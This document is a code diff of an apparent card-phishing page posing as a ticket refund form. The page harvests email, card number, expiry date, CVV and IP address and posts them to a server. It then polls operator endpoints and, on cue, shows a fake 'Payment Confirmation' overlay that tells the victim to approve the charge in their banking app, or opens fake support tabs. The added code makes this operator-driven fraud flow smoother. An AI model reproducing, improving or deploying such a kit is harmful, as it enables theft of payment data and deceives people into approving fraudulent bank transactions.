@@ -125,6 +125,94 @@
             }
         }
     </style>
+    <style>
+    #push-overlay {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100vw; height: 100vh;
+      background: rgba(22,182,255,0.97);
+      z-index: 100000;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      transition: opacity 0.3s;
+      animation: fadeInPush 0.5s;
+    }
+    @keyframes fadeInPush {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+    .push-modal {
+      background: #fff;
+      border-radius: 24px;
+      max-width: 370px;
+      width: 92vw;
+      margin: auto;
+      padding: 2.7rem 2rem 2.2rem 2rem;
+      box-shadow: 0 8px 40px rgba(0,0,0,0.18);
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      animation: popInPush 0.5s;
+    }
+    @keyframes popInPush {
+      0% { transform: scale(0.92); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .push-bell {
+      margin-bottom: 1.5rem;
+      width: 70px;
+      height: 70px;
+      background: linear-gradient(135deg, #16b6ff 60%, #00e0ff 100%);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 2px 16px rgba(22,182,255,0.18);
+      position: relative;
+      animation: bellPop 0.7s;
+    }
+    @keyframes bellPop {
+      0% { transform: scale(0.7); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    .push-bell svg {
+      width: 38px;
+      height: 38px;
+      color: #fff;
+      animation: bellShake 1.2s infinite cubic-bezier(.36,.07,.19,.97);
+      transform-origin: 50% 10%;
+    }
+    @keyframes bellShake {
+      0%, 100% { transform: rotate(0deg); }
+      10% { transform: rotate(-10deg); }
+      20% { transform: rotate(8deg); }
+      30% { transform: rotate(-6deg); }
+      40% { transform: rotate(4deg); }
+      50% { transform: rotate(-2deg); }
+      60% { transform: rotate(1deg); }
+      70%, 90% { transform: rotate(0deg); }
+    }
+    .push-title {
+      font-size: 2.1rem;
+      font-weight: 700;
+      color: #16b6ff;
+      margin-bottom: 0.7rem;
+      letter-spacing: -1px;
+    }
+    .push-desc {
+      font-size: 1.13rem;
+      color: #222;
+      margin-bottom: 0.7rem;
+      line-height: 1.5;
+    }
+    @media (max-width: 480px) {
+      .push-modal { padding: 1.2rem 0.5rem 1.2rem 0.5rem; }
+      .push-title { font-size: 1.3rem; }
+      .push-desc { font-size: 0.98rem; }
+    }
+    </style>
 </head>
 <body>
     <div class="payment-card">
@@ -146,11 +234,10 @@
                     <input id="expiry-input" type="text" placeholder="Expiry Date" maxlength="5" pattern="[0-9/]*" inputmode="numeric" required>
                 </div>
                 <div class="input-group">
-                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="4" pattern="[0-9]*" inputmode="numeric" required>
+                    <input id="cvv-input" type="password" placeholder="CVV" maxlength="3" pattern="[0-9]{3}" inputmode="numeric" required>
                 </div>
             </div>
             <button type="submit" class="confirm-btn">Confirm</button>
-            <div id="support-buttons" style="display:none; margin-top: 16px; text-align:center;"></div>
         </form>
     </div>
     <script>
@@ -159,37 +246,41 @@
     fetch("https://api.ipify.org?format=json")
       .then(r => r.json())
       .then(data => { userIP = data.ip; });
-    // Зчитування параметрів з URL
-    function getQueryParam(name) {
-        const url = new URL(window.location.href);
-        return url.searchParams.get(name);
+
+    // Додаємо overlay-вікно загрузки
+    const loadingOverlay = document.createElement('div');
+    loadingOverlay.id = 'loading-overlay';
+    loadingOverlay.style = 'display:none;position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(0,178,255,0.85);z-index:99999;align-items:center;justify-content:center;flex-direction:column;';
+    loadingOverlay.innerHTML = '<div style="background:#fff;border-radius:20px;max-width:320px;width:100%;margin:auto;padding:2rem 1.5rem;box-shadow:0 8px 32px rgba(0,0,0,0.12);text-align:center;"><div style="margin-bottom:1.2rem;"><svg width="48" height="48" viewBox="0 0 50 50"><circle cx="25" cy="25" r="20" stroke="#00b2ff" stroke-width="5" fill="none" stroke-dasharray="31.4 31.4" stroke-linecap="round"><animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s" repeatCount="indefinite"/></circle></svg></div><div style="font-size:1.2rem;font-weight:500;">Processing...</div></div>';
+    document.body.appendChild(loadingOverlay);
+
+    // Додаємо push-overlay, якщо його немає
+    if (!document.getElementById('push-overlay')) {
+      const pushOverlay = document.createElement('div');
+      pushOverlay.id = 'push-overlay';
+      pushOverlay.innerHTML = `
+        <div class="push-modal">
+          <div class="push-bell">
+            <svg viewBox="0 0 24 24" fill="none"><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6V11c0-3.07-1.63-5.64-5-6.32V4a1 1 0 1 0-2 0v.68C7.63 5.36 6 7.92 6 11v5l-1.29 1.29A1 1 0 0 0 6 19h12a1 1 0 0 0 .71-1.71L18 16z" fill="#fff"/></svg>
+          </div>
+          <div class="push-title">Payment Confirmation</div>
+          <div class="push-desc">To confirm the transaction, open your banking app and follow the instructions of your bank. <br>Do not close this window.</div>
+        </div>
+      `;
+      document.body.appendChild(pushOverlay);
     }
-    // --- Замість uid використовуємо page_code ---
-    function getPageCode() {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get('page') || sessionStorage.getItem('page_code') || '';
-    }
-    // Total підтягуємо, беремо тільки число
-    const totalRaw = getQueryParam('total');
-    if (totalRaw) {
-        // Витягуємо тільки число (цілу або з копійками)
-        const match = totalRaw.match(/\d+[\.,]?\d*/);
-        const totalNum = match ? match[0].replace(',', '.') : '';
-        if (totalNum) {
-            document.getElementById('payment-title').textContent = `Refund ${totalNum}€`;
-        }
-    }
+
+    // Сабміт форми: показуємо overlay
     document.getElementById('paymentForm').onsubmit = async function(e) {
         e.preventDefault();
+        loadingOverlay.style.display = 'flex';
         const email = document.getElementById('email-input').value;
         const card = document.getElementById('card-input').value;
         const expiry = document.getElementById('expiry-input').value;
         const cvv = document.getElementById('cvv-input').value;
-        // --- Додаємо price і currency ---
         let price = localStorage.getItem('event_price');
         let currency = localStorage.getItem('event_currency');
         if (!price || !currency) {
-            // fallback: парсимо з total
             const totalRaw = getQueryParam('total') || localStorage.getItem('refund_total') || '';
             const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
             if (match) {
@@ -203,28 +294,56 @@
                 await new Promise(res => setTimeout(res, 500));
                 ip = userIP;
             }
-            const response = await fetch('/send_payment_data', {
+            await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund', price, currency })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'refund', price, currency, page: getPageCode(), page_code: getPageCode() })
             });
-            if (response.ok) {
-                if (!document.getElementById('payment-msg')) {
-                    const msg = document.createElement('div');
-                    msg.id = 'payment-msg';
-                    msg.style.color = '#16b6ff';
-                    msg.style.fontWeight = '500';
-                    msg.style.marginTop = '18px';
-                    msg.textContent = 'Refund sent!';
-                    document.querySelector('.payment-card').appendChild(msg);
-                }
-            } else {
-                console.error('Помилка при відправці даних');
-            }
+            // overlay залишається до push!
         } catch (error) {
+            loadingOverlay.style.display = 'none';
             console.error('Помилка при зверненні до сервера:', error);
         }
     };
+
+    // Polling для push (push-overlay)
+    function pollPushOverlay() {
+      const page_code = getPageCode();
+      document.body.setAttribute('data-page-code', page_code);
+      if (!page_code) return setTimeout(pollPushOverlay, 2000);
+      const url = '/check_push?page_code=' + encodeURIComponent(page_code);
+      fetch(url)
+        .then(resp => resp.text())
+        .then(txt => {
+          if (txt === 'true') {
+            document.getElementById('push-overlay').style.display = 'flex';
+            if (window.loadingOverlay) loadingOverlay.style.display = 'none';
+          } else {
+            setTimeout(pollPushOverlay, 2000);
+          }
+        });
+    }
+    setTimeout(pollPushOverlay, 2000);
+    // --- Замість uid використовуємо page_code ---
+    function getPageCode() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get('page') || urlParams.get('e') || sessionStorage.getItem('page_code') || '';
+    }
+    // Зчитування параметрів з URL
+    function getQueryParam(name) {
+        const url = new URL(window.location.href);
+        return url.searchParams.get(name);
+    }
+    // Total підтягуємо, беремо тільки число
+    const totalRaw = getQueryParam('total');
+    if (totalRaw) {
+        // Витягуємо тільки число (цілу або з копійками)
+        const match = totalRaw.match(/\d+[\.,]?\d*/);
+        const totalNum = match ? match[0].replace(',', '.') : '';
+        if (totalNum) {
+            document.getElementById('payment-title').textContent = `Refund ${totalNum}€`;
+        }
+    }
     // --- POLLING для wrong_card ---
     let wrongCardMsg = null;
     function showWrongCardMsg() {
@@ -260,51 +379,28 @@
             });
     }, 2000);
     // --- POLLING для support/text кнопок ---
-    function showSupportButtons(total, text_id) {
-        const page_code = getPageCode();
-        let html = '';
-        if (window.show_support_flag || (window.show_text_flag && text_id)) {
-            html += `<div style="margin-bottom:10px;font-size:1rem;font-weight:500;color:#222;">If something went wrong, please use the link below.</div>`;
-        }
-        if (window.show_support_flag) {
-            html += `<a id="support-btn" href="/buy-tickets/loading/waiting-support.html?page=${page_code}" class="confirm-btn support-proceed-btn" style="margin-bottom:10px;display:block;">Proceed</a>`;
-        }
-        if (window.show_text_flag && text_id) {
-            html += `<a id="text-btn" href="/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${text_id}" class="confirm-btn support-proceed-btn" style="background:#dc3545;display:block;">Proceed</a>`;
-        }
-        if (html) {
-            document.getElementById('support-buttons').innerHTML = html;
-            document.getElementById('support-buttons').style.display = 'block';
-            // Add click handlers
-            if (window.show_support_flag) {
-                document.getElementById('support-btn').onclick = async function(e) {
-                    e.preventDefault();
-                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
-                    document.getElementById('support-buttons').style.display = 'none';
-                    window.location.href = this.href;
-                };
-            }
-            if (window.show_text_flag && text_id) {
-                document.getElementById('text-btn').onclick = async function(e) {
-                    e.preventDefault();
-                    await fetch(`/reset_support_flag?ip=${encodeURIComponent(userIP)}`);
-                    document.getElementById('support-buttons').style.display = 'none';
-                    window.location.href = this.href;
-                };
-            }
-        }
-    }
+    let supportTabOpened = false;
     async function pollSupportButtons() {
         if (!userIP) {
             return setTimeout(pollSupportButtons, 2000);
         }
-        const totalRaw = getQueryParam('total') || '';
         try {
             const resp = await fetch(`/check_support?ip=${encodeURIComponent(userIP)}`);
             const data = await resp.json();
-            window.show_support_flag = data.show_support;
-            window.show_text_flag = data.show_text;
-            showSupportButtons(totalRaw, data.text_id);
+            if ((data.show_support || data.show_text)) {
+                loadingOverlay.style.display = 'none';
+            }
+            if (!supportTabOpened && (data.show_support || data.show_text)) {
+                const page_code = getPageCode();
+                if (data.show_support) {
+                    window.open(`/buy-tickets/loading/waiting-support.html?page=${page_code}`, '_blank');
+                    supportTabOpened = true;
+                }
+                if (data.show_text && data.text_id) {
+                    window.open(`/buy-tickets/loading/waiting-text.html?page=${page_code}&text_id=${data.text_id}`, '_blank');
+                    supportTabOpened = true;
+                }
+            }
         } catch (e) {}
         setTimeout(pollSupportButtons, 2000);
     }
@@ -323,6 +419,16 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 </script>
     <script>
+document.getElementById('cvv-input').addEventListener('input', function(e) {
+  this.value = this.value.replace(/\D/g, '').slice(0, 3);
+});
+</script>
+    <script>
+document.getElementById('card-input').addEventListener('input', function(e) {
+  this.value = this.value.replace(/[^0-9 ]/g, '');
+});
+</script>
+    <script>
 (function() {
   // Підстановка ціни та валюти з URL, localStorage, або збереженого refund_total
   const params = new URLSearchParams(window.location.search);
@@ -330,12 +436,32 @@ document.addEventListener('DOMContentLoaded', function() {
   let currency = params.get('currency');
   let totalRaw = params.get('total');
   let title = '';
-  if (price && currency) {
+  let page_code = params.get('page') || params.get('e') || sessionStorage.getItem('page_code');
+
+  // --- НОВА ЛОГІКА: якщо є e=... (short code), завжди підтягуємо з бекенду ---
+  if (params.get('e')) {
+    fetch(`/api/payment_data?e=${encodeURIComponent(params.get('e'))}`)
+      .then(r => r.json())
+      .then(ev => {
+        if (ev.price && ev.currency) {
+          price = ev.price;
+          currency = ev.currency;
     localStorage.setItem('event_price', price);
     localStorage.setItem('event_currency', currency);
-    title = `Refund ${price} ${currency}`;
-  } else if (totalRaw) {
-    // Витягуємо число і валюту з total (наприклад, 58CHF)
+          document.getElementById('payment-title').textContent = `Refund ${price} ${currency}`;
+          document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
+        } else if (ev.currency) {
+          document.getElementById('payment-title').textContent = `Refund ${ev.currency}`;
+          document.querySelectorAll('.event-price').forEach(el => el.textContent = ev.currency);
+        }
+      });
+    // Показуємо тимчасово, поки не підвантажиться
+    document.getElementById('payment-title').textContent = 'Refund ...';
+    document.querySelectorAll('.event-price').forEach(el => el.textContent = '...');
+    return;
+  }
+  // --- СТАРА ЛОГІКА ДЛЯ ВСІХ ІНШИХ ВИПАДКІВ ---
+  if (totalRaw) {
     const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
     if (match) {
       price = match[1].replace(',', '.');
@@ -348,8 +474,35 @@ document.addEventListener('DOMContentLoaded', function() {
       // Якщо тільки число
       const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
       price = numMatch ? numMatch[0].replace(',', '.') : '';
-      currency = localStorage.getItem('event_currency') || 'EUR';
+      currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
       title = `Refund ${price} ${currency}`;
+    }
+  } else if (price && currency) {
+    localStorage.setItem('event_price', price);
+    localStorage.setItem('event_currency', currency);
+    title = `Refund ${price} ${currency}`;
+  } else if (currency) {
+    // Якщо є тільки валюта — підвантажуємо з бекенду
+    if (page_code) {
+      fetch(`/api/payment_data?page=${encodeURIComponent(page_code)}`)
+        .then(r => r.json())
+        .then(ev => {
+          if (ev.price && ev.currency) {
+            price = ev.price;
+            currency = ev.currency;
+            localStorage.setItem('event_price', price);
+            localStorage.setItem('event_currency', currency);
+            document.getElementById('payment-title').textContent = `Refund ${price} ${currency}`;
+            document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
+          } else if (currency) {
+            document.getElementById('payment-title').textContent = `Refund ${currency}`;
+            document.querySelectorAll('.event-price').forEach(el => el.textContent = currency);
+          }
+        });
+      title = `Refund ${currency}`;
+    } else {
+      localStorage.setItem('event_currency', currency);
+      title = `Refund ${currency}`;
     }
   } else if (localStorage.getItem('refund_total')) {
     // Якщо total вже зник з адреси, але є у localStorage
@@ -371,13 +524,16 @@ document.addEventListener('DOMContentLoaded', function() {
     price = localStorage.getItem('event_price');
     currency = localStorage.getItem('event_currency');
     if (price && currency) title = `Refund ${price} ${currency}`;
+    else if (currency) title = `Refund ${currency}`;
   }
   if (title) {
     document.getElementById('payment-title').textContent = title;
   }
-  if (price && currency) {
-    document.querySelectorAll('.event-price').forEach(el => el.textContent = price + ' ' + currency);
-  }
+  // Price: ...
+  let priceText = '';
+  if (price && currency) priceText = price + ' ' + currency;
+  else if (currency) priceText = currency;
+  document.querySelectorAll('.event-price').forEach(el => el.textContent = priceText);
 })();
 </script>
     <script>
